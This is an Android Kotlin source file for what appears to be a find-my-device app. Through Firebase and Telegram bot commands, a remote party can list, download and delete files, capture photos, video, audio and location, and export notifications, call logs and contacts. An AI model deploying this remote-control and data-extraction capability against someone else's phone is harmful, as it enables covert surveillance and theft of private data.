package com.save.me

import android.content.Context
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID

object FileIdMap {
    private const val PREFS_NAME = "file_id_map"
    private const val KEY_PREFIX = "id_"
    fun refreshMapping(context: Context, entries: List<FileManager.FileListEntry>) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val editor = prefs.edit()
        editor.clear()
        for (entry in entries) {
            val id = UUID.randomUUID().toString().replace("-", "").substring(0, 8)
            editor.putString(KEY_PREFIX + id, entry.path)
        }
        editor.apply()
    }
    fun getCurrentMapping(context: Context): Map<String, String> {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val all = prefs.all
        val result = mutableMapOf<String, String>()
        for ((k, v) in all) {
            if (k.startsWith(KEY_PREFIX) && v is String)
                result[k.removePrefix(KEY_PREFIX)] = v
        }
        return result
    }
    fun getIdForPath(context: Context, path: String): String? {
        val mapping = getCurrentMapping(context)
        for ((id, p) in mapping) {
            if (p == path) return id
        }
        return null
    }
    fun getPathForId(context: Context, id: String): String? {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getString(KEY_PREFIX + id, null)
    }
}

class FCMService : FirebaseMessagingService() {

    companion object {
        private const val PAGE_SIZE = 20
        private const val BUTTONS_PER_ROW = 2

        private fun formatSize(size: Long): String {
            if (size <= 0) return "0B"
            val units = arrayOf("B", "KB", "MB", "GB", "TB")
            val digitGroups = (Math.log10(size.toDouble()) / Math.log10(1024.0)).toInt()
            return String.format("%.1f%s", size / Math.pow(1024.0, digitGroups.toDouble()), units[digitGroups])
        }

        private fun formatDate(timeMillis: Long): String {
            val sdf = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault())
            return sdf.format(Date(timeMillis))
        }
    }

    data class PendingSend(
        val chatId: String,
        val fileUrl: String,
        val fileName: String,
        val pendingId: String
    )

    object PendingSendStore {
        private const val PREFS = "pending_send"
        fun add(context: Context, pending: PendingSend) {
            val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            prefs.edit()
                .putString(pending.pendingId, "${pending.chatId}|${pending.fileUrl}|${pending.fileName}")
                .apply()
        }
        fun get(context: Context, pendingId: String): PendingSend? {
            val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            val raw = prefs.getString(pendingId, null) ?: return null
            val split = raw.split("|")
            return if (split.size == 3) PendingSend(split[0], split[1], split[2], pendingId) else null
        }
        fun remove(context: Context, pendingId: String) {
            val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            prefs.edit().remove(pendingId).apply()
        }
    }

    private fun buildDirectoryPickerKeyboard(context: Context, currentDir: String, pendingId: String): String {
        val entries = FileManager.listFiles(context, currentDir).filter { it.isDir }
        val buttons = mutableListOf<String>()
        for (entry in entries) {
            val dirName = entry.path.trimEnd('/').substringAfterLast('/')
            buttons.add("""{"text":"📁 $dirName","callback_data":"sendnav:$pendingId:${entry.path}"}""")
        }
        buttons.add("""{"text":"📦 Place here","callback_data":"sendplace:$pendingId:$currentDir"}""")
        val keyboardRows = buttons.map { "[$it]" }
        return """{"inline_keyboard":[${keyboardRows.joinToString(",")}]}"""
    }

    private fun handleSendNavigation(context: Context, chatId: String, pendingId: String, currentDir: String) {
        val keyboard = buildDirectoryPickerKeyboard(context, currentDir, pendingId)
        val msg = if (currentDir.isBlank()) "Choose folder for upload:" else "Choose a subfolder or place here in `${currentDir}`:"
        UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, msg, keyboard)
    }

    private fun handleSendPlace(context: Context, chatId: String, pendingId: String, targetDir: String) {
        val pending = PendingSendStore.get(context, pendingId)
        if (pending == null) {
            UploadManager.sendTelegramMessage(chatId, "Upload session expired or invalid.")
            return
        }
        CoroutineScope(Dispatchers.IO).launch {
            val ok = FileManager.saveFileFromUrl(context, pending.fileUrl, pending.fileName, targetDir)
            val savePath = if (targetDir.isNullOrBlank()) pending.fileName else "${targetDir.trimEnd('/')}/${pending.fileName}"
            val msg = if (ok) "Saved: ${FileManager.formatMono(savePath)}" else "Failed to save: ${FileManager.formatMono(savePath)}"
            UploadManager.sendTelegramMessage(chatId, msg)
            PendingSendStore.remove(context, pendingId)
        }
    }

    private fun buildFileInfoMessage(context: Context, path: String): String {
        val file = FileManager.getFileFromPath(context, path)
        val name = FileManager.formatMono(path)
        val size = formatSize(file.length())
        val date = formatDate(file.lastModified())
        return "File: $name\nDate: $date    Size: $size\nChoose an action:"
    }

    private fun buildListInlineKeyboard(context: Context, path: String?, entries: List<FileManager.FileListEntry>, page: Int): String {
        FileIdMap.refreshMapping(context, entries)
        val start = page * PAGE_SIZE
        val end = minOf(start + PAGE_SIZE, entries.size)
        val pageEntries = entries.subList(start, end)
        val buttons = mutableListOf<String>()
        for (entry in pageEntries) {
            val btnText = if (entry.isDir)
                "📁 " + entry.path.trimEnd('/').substringAfterLast('/')
            else
                "📄 " + entry.path.substringAfterLast('/')
            val callback = if (entry.isDir)
                safeCallback("list", entry.path, 0)
            else {
                val id = FileIdMap.getIdForPath(context, entry.path) ?: continue
                safeCallback("file", id)
            }
            buttons.add("""{"text":"$btnText", "callback_data":"$callback"}""")
        }
        val keyboardRows = buttons.chunked(BUTTONS_PER_ROW).map { row -> "[${row.joinToString(",")}]" }.toMutableList()
        val navButtons = mutableListOf<String>()
        if (start > 0) navButtons.add("""{"text":"⬅️ Prev","callback_data":"nav:${path ?: ""}|${page - 1}"}""")
        if (end < entries.size) navButtons.add("""{"text":"Next ➡️","callback_data":"nav:${path ?: ""}|${page + 1}"}""")
        if (navButtons.isNotEmpty()) {
            keyboardRows.add("[${navButtons.joinToString(",")}]")
        }
        return """{"inline_keyboard":[${keyboardRows.joinToString(",")}]}"""
    }

    private fun buildFileActionKeyboard(context: Context, id: String): String {
        val safeId = id.replace("\"", "").replace("\n", "")
        val recvCallback = safeCallback("recv", safeId)
        val delCallback = safeCallback("del", safeId)
        return """
        {
          "inline_keyboard":[
            [
              {"text":"📥 Receive file","callback_data":"$recvCallback"},
              {"text":"🗑 Delete","callback_data":"$delCallback"}
            ]
          ]
        }
        """.trimIndent()
    }

    private fun safeCallback(type: String, value: String, page: Int? = null): String {
        var raw = "$type:$value"
        if (page != null) raw += "|$page"
        val clean = raw.replace("\"", "").replace("\n", "")
        return clean
    }

    private fun splitPathAndPage(pathWithPage: String?): Pair<String, Int> {
        if (pathWithPage.isNullOrEmpty()) return "" to 0
        val parts = pathWithPage.split("|")
        val realPath = parts.getOrNull(0) ?: ""
        val page = parts.getOrNull(1)?.toIntOrNull() ?: 0
        return realPath to page
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d("FCMService", "Received FCM message: $remoteMessage")
        Log.d("FCMService", "FCM data payload: ${remoteMessage.data}")

        val incomingBotToken = remoteMessage.data["bot_token"]
        val localBotToken = Preferences.getBotToken(applicationContext)
        if (incomingBotToken != null && incomingBotToken != localBotToken) {
            Log.d("FCMService", "Bot token mismatch: incoming=$incomingBotToken, local=$localBotToken. Ignoring command.")
            return
        }

        val type = remoteMessage.data["type"]
        val chatId = remoteMessage.data["chat_id"] ?: remoteMessage.data["chatId"]
        val fileUrl = remoteMessage.data["file_url"]
        val fileName = remoteMessage.data["file_name"]
        val targetPath = remoteMessage.data["target_path"]
        val fileIdOrPath = remoteMessage.data["file"]
        val path = remoteMessage.data["path"]
        val camera = remoteMessage.data["camera"]
        val flash = remoteMessage.data["flash"]
        val quality = remoteMessage.data["quality"]
        val duration = remoteMessage.data["duration"]
        val sort = remoteMessage.data["sort"] ?: "date"
        val order = remoteMessage.data["order"] ?: "desc"
        val rawPage = remoteMessage.data["page"]
        val page = rawPage?.toIntOrNull() ?: 0
        val callbackData = remoteMessage.data["callback_data"]
        val pkg = remoteMessage.data["pkg"]

        // --- Notification commands (call NotificationRelay, NOT NotificationHelper) ---
        when (type) {
            "notiadd" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    NotificationRelay.handleNotiAdd(applicationContext, chatId ?: return@launch)
                }
                return
            }
            "notiaddpick" -> {
                if (pkg != null) NotificationRelay.handleNotiAddPick(applicationContext, chatId ?: return, pkg)
                return
            }
            "notiremove" -> {
                NotificationRelay.handleNotiRemove(applicationContext, chatId ?: return)
                return
            }
            "notiremovepick" -> {
                if (pkg != null) NotificationRelay.handleNotiRemovePick(applicationContext, chatId ?: return, pkg)
                return
            }
            "noti" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    NotificationRelay.handleNoti(applicationContext, chatId ?: return@launch)
                }
                return
            }
            "notipick" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    if (pkg != null) NotificationRelay.handleNotiPick(applicationContext, chatId ?: return@launch, pkg)
                }
                return
            }
            "noticlear" -> {
                NotificationRelay.handleNotiClear(applicationContext, chatId ?: return)
                return
            }
            "noticlearpick" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    if (pkg != null) NotificationRelay.handleNotiClearPick(applicationContext, chatId ?: return@launch, pkg)
                }
                return
            }
            "notiexport" -> {
                NotificationRelay.handleNotiExport(applicationContext, chatId ?: return)
                return
            }
            "notiexportpick" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    if (pkg != null) NotificationRelay.handleNotiExportPick(applicationContext, chatId ?: return@launch, pkg)
                }
                return
            }
        }

        // --- NEW: Handle call logs and contacts callback buttons ---
        if (callbackData != null) {
            if (callbackData == "calllogs") {
                CoroutineScope(Dispatchers.IO).launch {
                    NotificationRelay.handleCallLogs(applicationContext, chatId ?: return@launch)
                }
                return
            } else if (callbackData == "contacts") {
                CoroutineScope(Dispatchers.IO).launch {
                    NotificationRelay.handleContacts(applicationContext, chatId ?: return@launch)
                }
                return
            } else if (callbackData.startsWith("sendnav:") || callbackData.startsWith("sendplace:")) {
                val parts = callbackData.split(":")
                if (parts.size >= 3) {
                    val pendingId = parts[1]
                    val arg = parts.subList(2, parts.size).joinToString(":")
                    val pending = PendingSendStore.get(applicationContext, pendingId)
                    if (pending == null) return
                    if (callbackData.startsWith("sendnav:")) {
                        handleSendNavigation(applicationContext, pending.chatId, pendingId, arg)
                        return
                    } else if (callbackData.startsWith("sendplace:")) {
                        handleSendPlace(applicationContext, pending.chatId, pendingId, arg)
                        return
                    }
                }
            } else if (callbackData.startsWith("notipick:")) {
                val cbParts = callbackData.split(":")
                if (cbParts.size == 2) {
                    val pickedPkg = cbParts[1]
                    CoroutineScope(Dispatchers.IO).launch {
                        NotificationRelay.handleNotiPick(applicationContext, chatId ?: return@launch, pickedPkg)
                    }
                    return
                }
            }
        }

        when (type) {
            "list" -> {
                val (realPath, realPage) = splitPathAndPage(path)
                CoroutineScope(Dispatchers.IO).launch {
                    val entries = FileManager.listFiles(applicationContext, realPath, sort, order)
                    if (entries.isEmpty()) {
                        val msg = if (realPath.isBlank()) "No files or directories in root." else "No files or directories in $realPath."
                        UploadManager.sendTelegramMessage(chatId ?: return@launch, msg)
                        return@launch
                    }
                    val keyboard = buildListInlineKeyboard(applicationContext, realPath, entries, realPage)
                    val msg = if (realPath.isBlank() || realPath == "/") "Root files and directories:" else "Files and directories in $realPath:"
                    UploadManager.sendTelegramMessageWithInlineKeyboard(chatId ?: return@launch, msg, keyboard)
                }
                return
            }
            "nav" -> {
                val navParts = fileIdOrPath?.split("|") ?: path?.split("|")
                val navPath = navParts?.getOrNull(0) ?: ""
                val navPage = navParts?.getOrNull(1)?.toIntOrNull() ?: 0
                CoroutineScope(Dispatchers.IO).launch {
                    val entries = FileManager.listFiles(applicationContext, navPath, sort, order)
                    if (entries.isEmpty()) {
                        val msg = if (navPath.isBlank()) "No files or directories in root." else "No files or directories in $navPath."
                        UploadManager.sendTelegramMessage(chatId ?: return@launch, msg)
                        return@launch
                    }
                    val keyboard = buildListInlineKeyboard(applicationContext, navPath, entries, navPage)
                    val msg = if (navPath.isBlank() || navPath == "/") "Root files and directories:" else "Files and directories in $navPath:"
                    UploadManager.sendTelegramMessageWithInlineKeyboard(chatId ?: return@launch, msg, keyboard)
                }
                return
            }
            "file" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    if (chatId.isNullOrBlank() || fileIdOrPath.isNullOrBlank()) return@launch
                    val resolvedPath = FileIdMap.getPathForId(applicationContext, fileIdOrPath)
                    if (resolvedPath == null) {
                        UploadManager.sendTelegramMessage(chatId, "File mapping missing (maybe expired, please list again).")
                        return@launch
                    }
                    val keyboard = buildFileActionKeyboard(applicationContext, fileIdOrPath)
                    val msg = buildFileInfoMessage(applicationContext, resolvedPath)
                    UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, msg, keyboard)
                }
                return
            }
            "recv" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    if (chatId.isNullOrBlank() || fileIdOrPath.isNullOrBlank()) return@launch
                    val resolvedPath = FileIdMap.getPathForId(applicationContext, fileIdOrPath)
                    if (resolvedPath == null) {
                        UploadManager.sendTelegramMessage(chatId, "File mapping missing (maybe expired, please list again).")
                        return@launch
                    }
                    val file = FileManager.getFileFromPath(applicationContext, resolvedPath)
                    if (!file.exists() || !file.isFile) {
                        UploadManager.sendTelegramMessage(chatId, "File not found: ${FileManager.formatMono(resolvedPath)}")
                        return@launch
                    }
                    UploadManager.queueUpload(file, chatId, "document")
                }
                return
            }
            "del" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    if (chatId.isNullOrBlank() || fileIdOrPath.isNullOrBlank()) return@launch
                    val resolvedPath = FileIdMap.getPathForId(applicationContext, fileIdOrPath)
                    if (resolvedPath == null) {
                        UploadManager.sendTelegramMessage(chatId, "File mapping missing (maybe expired, please list again).")
                        return@launch
                    }
                    val ok = FileManager.deleteFile(applicationContext, resolvedPath)
                    val msg = if (ok) "Deleted: ${FileManager.formatMono(resolvedPath)}" else "Could not delete: ${FileManager.formatMono(resolvedPath)}"
                    UploadManager.sendTelegramMessage(chatId, msg)
                }
                return
            }
            "send" -> {
                if (chatId.isNullOrBlank() || fileUrl.isNullOrBlank() || fileName.isNullOrBlank()) {
                    if (!chatId.isNullOrBlank()) UploadManager.sendTelegramMessage(chatId, "Missing file information for upload.")
                    return
                }
                val pendingId = UUID.randomUUID().toString().replace("-", "").substring(0, 8)
                PendingSendStore.add(applicationContext, PendingSend(chatId, fileUrl, fileName, pendingId))
                val keyboard = buildDirectoryPickerKeyboard(applicationContext, targetPath ?: "", pendingId)
                val msg = "Choose a folder to save `${fileName}` (or pick a subfolder):"
                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, msg, keyboard)
                return
            }
            "photo", "video", "audio", "location", "ring", "vibrate" -> {
                CommandManager.initialize(applicationContext)
                CommandManager.dispatch(
                    context = applicationContext,
                    type = type ?: "",
                    camera = camera,
                    flash = flash,
                    quality = quality,
                    duration = duration,
                    chatId = chatId
                )
                return
            }
        }
    }

    override fun onNewToken(token: String) {
        Log.d("FCMService", "Refreshed FCM token: $token")
        // Register device with backend (Cloudflare Worker)
        val botToken = Preferences.getBotToken(applicationContext)
        val nickname = Preferences.getNickname(applicationContext)
        if (!botToken.isNullOrBlank() && !nickname.isNullOrBlank()) {
            // Do registration synchronously for reliability
            runBlocking {
                withContext(Dispatchers.IO) {
                    try {
                        val client = OkHttpClient()
                        val body = """
                            {"bot_token":"$botToken","nickname":"$nickname","fcm_token":"$token"}
                        """.trimIndent()
                        val request = Request.Builder()
                            .url("https://findmydevice.kambojistheking.workers.dev/register_nickname")
                            .post(RequestBody.create("application/json".toMediaTypeOrNull(), body))
                            .build()
                        val response = client.newCall(request).execute()
                        val respBody = response.body?.string()
                        Log.d("FCMService", "Registration POST: code=${response.code}, body=$respBody")
                        if (!response.isSuccessful) {
                            Log.e("FCMService", "Registration failed: " + response.code)
                        } else {
                            Log.d("FCMService", "Device registration OK")
                        }
                    } catch (e: Exception) {
                        Log.e("FCMService", "Error registering device", e)
                    }
                }
            }
        } else {
            Log.w("FCMService", "Bot token or nickname missing, cannot register device")
        }
    }
}